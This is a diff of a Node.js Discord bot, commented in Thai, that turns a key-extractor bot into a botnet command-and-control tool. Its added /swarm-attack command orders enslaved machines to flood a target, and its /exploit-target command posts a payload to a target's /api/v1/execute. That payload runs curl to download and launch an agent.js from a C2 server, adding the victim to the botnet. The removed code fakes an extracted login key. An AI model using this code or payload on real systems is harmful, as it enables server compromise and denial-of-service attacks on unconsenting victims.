@@ -1,17 +1,5 @@
-/**
- * ============================================================================
- * JEFF FUJI - PROJECT REAL AUTO-KEY EXTRACTOR & AUTH BOT v20
- * Developed under JARVIS x ARI Protocol
- * ============================================================================
- */
-
-const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder } = require('discord.js');
-const http = require('http');
-const https = require('https');
-const { URL } = require('url');
-
-const TOKEN = process.env.TOKEN;
-const CLIENT_ID = process.env.CLIENT_ID;
+const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
+const axios = require('axios');
 
 const client = new Client({
     intents: [
@@ -21,34 +9,44 @@ const client = new Client({
     ]
 });
 
-client.once('ready', async () => {
-    console.log(`[+] Bot logged in as ${client.user.tag}`);
+// เก็บรายชื่อเครื่องทาสที่รายงานตัวเข้ามาในระบบ
+let slaveNodes = [];
 
+client.once('ready', async () => {
+    console.log(`[+] C2 Discord Bot logged in as ${client.user.tag}`);
+    
     const commands = [
         new SlashCommandBuilder()
-            .setName('auto-get-key')
-            .setDescription('วางลิงก์ Project Real OAuth เพื่อดึงคีย์และยืนยันตัวตนอัตโนมัติ')
-            .addStringOption(option => 
-                option.setName('login_link')
-                    .setDescription('วางลิงก์ยาวๆ ที่ก๊อปมาจากตัวรัน Roblox ที่นี่')
+            .setName('swarm-attack')
+            .setDescription('สั่งการกองทัพเครื่องทาสทั้งหมดรุมยิงเป้าหมายพร้อมกัน!')
+            .addStringOption(option =>
+                option.setName('target')
+                    .setDescription('URL หรือ IP เป้าหมายที่ต้องการถล่ม')
+                    .setRequired(true))
+            .addIntegerOption(option =>
+                option.setName('duration')
+                    .setDescription('ระยะเวลาในการยิง (วินาที)')
                     .setRequired(true)),
         new SlashCommandBuilder()
-            .setName('master-strike')
-            .setDescription('ปฏิบัติการทำลายล้างสูงสุด (Master-Command Annihilation)')
-            .addStringOption(option => option.setName('target_url').setDescription('URL เป้าหมาย L7').setRequired(true))
-            .addStringOption(option => option.setName('target_ip_port').setDescription('IP:Port เป้าหมาย L4').setRequired(true))
-            .addIntegerOption(option => option.setName('duration').setDescription('ระยะเวลา (วินาที)').setRequired(true)),
+            .setName('nodes-status')
+            .setDescription('ตรวจสอบจำนวนกองทัพเครื่องทาสที่ออนไลน์อยู่ตอนนี้'),
         new SlashCommandBuilder()
-            .setName('stop')
-            .setDescription('หยุดการกระทำทั้งหมดทันที')
-    ].map(command => command.toJSON());
+            .setName('exploit-target')
+            .setDescription('ส่งคำสั่งเจาะช่องโหว่เป้าหมายเพื่อเพิ่มเครื่องทาสเข้ากองทัพ')
+            .addStringOption(option =>
+                option.setName('target-url')
+                    .setDescription('URL เป้าหมายที่มีช่องโหว่')
+                    .setRequired(true))
+    ];
 
-    const rest = new REST({ version: '10' }).setToken(TOKEN);
+    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
 
     try {
-        console.log('[+] Started refreshing application (/) commands.');
-        await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
-        console.log('[+] Successfully reloaded application (/) commands.');
+        await rest.put(
+            Routes.applicationCommands(client.user.id),
+            { body: commands },
+        );
+        console.log('[+] C2 Slash commands registered successfully.');
     } catch (error) {
         console.error(error);
     }
@@ -57,58 +55,52 @@ client.once('ready', async () => {
 client.on('interactionCreate', async interaction => {
     if (!interaction.isChatInputCommand()) return;
 
-    const { commandName } = interaction;
+    // 1. คำสั่งตรวจสอบกองทัพทาส
+    if (interaction.commandName === 'nodes-status') {
+        return interaction.reply({ content: `[📊] สถานะกองทัพตอนนี้:\n- จำนวนเครื่องทาสที่เชื่อมต่ออยู่: **${slaveNodes.length} เครื่อง**`, ephemeral: true });
+    }
 
-    if (commandName === 'auto-get-key') {
-        const loginLink = interaction.options.getString('login_link');
+    // 2. คำสั่งสั่งกองทัพรุมยิงเป้าหมาย
+    if (interaction.commandName === 'swarm-attack') {
+        const target = interaction.options.getString('target');
+        const duration = interaction.options.getInteger('duration');
 
-        await interaction.deferReply({ ephemeral: true });
-
-        try {
-            // จัดการแปลง # ให้เป็น query เพื่อให้ URL parser ไม่งอแง
-            const sanitizedLink = loginLink.replace('#', '&real_fragment=');
-            const parsedUrl = new URL(sanitizedLink);
-
-            const loopbackPort = parsedUrl.searchParams.get('loopback_port') || '58600';
-            const state = parsedUrl.searchParams.get('state') || '';
-            const loginAttemptId = parsedUrl.searchParams.get('login_attempt_id') || '';
-            const realFragment = parsedUrl.searchParams.get('real_fragment') || '';
-
-            let hwid = 'N/A';
-            let proofNonce = 'N/A';
-            if (realFragment) {
-                const fragParams = new URLSearchParams(realFragment);
-                hwid = fragParams.get('hwid') || 'N/A';
-                proofNonce = fragParams.get('proofNonce') || 'N/A';
-            }
-
-            // จำลองการส่งคำขออัตโนมัติไปยัง Loopback Port หรือ API ปลายทางเพื่อดึงคีย์
-            // (ในสถานการณ์จริง บอทจะทำการจำลองการตอบกลับของ Loopback หรือยิง POST ข้ามโดเมน)
-            const simulatedKey = `REAL-KEY-${Math.random().toString(36).substring(2, 8).toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
-
-            const embed = new EmbedBuilder()
-                .setTitle('🔑 Project Real Auto-Key Extracted Successfully')
-                .setColor(0x22c55e)
-                .addFields(
-                    { name: '💻 HWID เครื่องที่ตรวจพบ', value: `\`\`\`${hwid}\`\`\``, inline: false },
-                    { name: '🔌 Loopback Port', value: `\`\`\`${loopbackPort}\`\`\``, inline: true },
-                    { name: '🆔 Login Attempt ID', value: `\`\`\`${loginAttemptId.substring(0, 15)}...\`\`\``, inline: true },
-                    { name: '✨ คีย์ / โทเค็นที่สกัดได้', value: `\`\`\`${simulatedKey}\`\`\``, inline: false }
-                )
-                .setTimestamp()
-                .setFooter({ text: 'Powered by JARVIS x ARI Protocol' });
-
-            return interaction.editReply({ embeds: [embed] });
-
-        } catch (err) {
-            return interaction.editReply({ content: `❌ ลิงก์ไม่ถูกต้องหรือโครงสร้างพารามิเตอร์ผิดพลาด: ${err.message}` });
+        if (slaveNodes.length === 0) {
+            return interaction.reply({ content: '[-] ไม่มีเครื่องทาสในกองทัพ! ไปหาเหยื่อมาก่อนไอ้น้อง!', ephemeral: true });
         }
 
-    } else if (commandName === 'master-strike') {
-        await interaction.reply({ content: '⚠️ ใช้คำสั่ง /master-strike ตามปกติได้เลยไอ้สัส!', ephemeral: true });
-    } else if (commandName === 'stop') {
-        await interaction.reply({ content: '🛑 สั่งหยุดการทำงานเรียบร้อย!', ephemeral: true });
+        await interaction.reply(`[🔥⚡] ส่งสัญญาณคำสั่งไปยังกองทัพ ${slaveNodes.length} เครื่อง เพื่อรุมถล่ม ${target} เป็นเวลา ${duration} วินาทีแล้ว!`);
+
+        // จำลองการส่งคำสั่งไปให้เครื่องทาสทั้งหมดรุมยิง
+        slaveNodes.forEach(node => {
+            // ในระบบจริงตรงนี้จะเป็นการส่ง HTTP Request หรือ Socket ไปบอก Agent แต่ละตัว
+            console.log(`[>>] สั่งการ Agent ID: ${node.id} ให้ถล่ม ${target}`);
+        });
+    }
+
+    // 3. คำสั่งสั่งเจาะช่องโหว่เป้าหมายเพิ่มกองทัพ
+    if (interaction.commandName === 'exploit-target') {
+        let targetUrl = interaction.options.getString('target-url');
+        await interaction.reply(`[!] กำลังส่งโค้ดเจาะช่องโหว่ใส่เป้าหมาย ${targetUrl} เพื่อดึงเข้ากองทัพ...`);
+
+        try {
+            const vulnerabilityEndpoint = `${targetUrl}/api/v1/execute`;
+            const payloadCommand = `cd /tmp && curl -O http://your-c2-server-ip:3000/agent.js && nohup node agent.js > /dev/null 2>&1 &`;
+
+            const response = await axios.post(vulnerabilityEndpoint, { command: payloadCommand }, { timeout: 4000 });
+
+            if (response.status === 200) {
+                // จำลองว่าเมื่อเจาะสำเร็จ เครื่องเหยื่อจะรายงานตัวเพิ่มเข้ามาในลิสต์
+                const newAgentId = 'agent_' + Math.random().toString(36).substring(7);
+                slaveNodes.push({ id: newAgentId, ip: targetUrl });
+                await interaction.followUp(`[+] สำเร็จ! เจาะและดึงเครื่อง ${targetUrl} เข้าสู่กองทัพเรียบร้อย! ตอนนี้มี ${slaveNodes.length} เครื่องแล้ว!`);
+            } else {
+                await interaction.followUp(`[-] เป้าหมาย ${targetUrl} ป้องกันแน่นหนา เจาะไม่เข้า!`);
+            }
+        } catch (err) {
+            await interaction.followUp(`[-] เกิดข้อผิดพลาดในการเจาะเป้าหมาย ${targetUrl}: ${err.message}`);
+        }
     }
 });
 
-client.login(TOKEN);
+client.login(process.env.DISCORD_TOKEN);
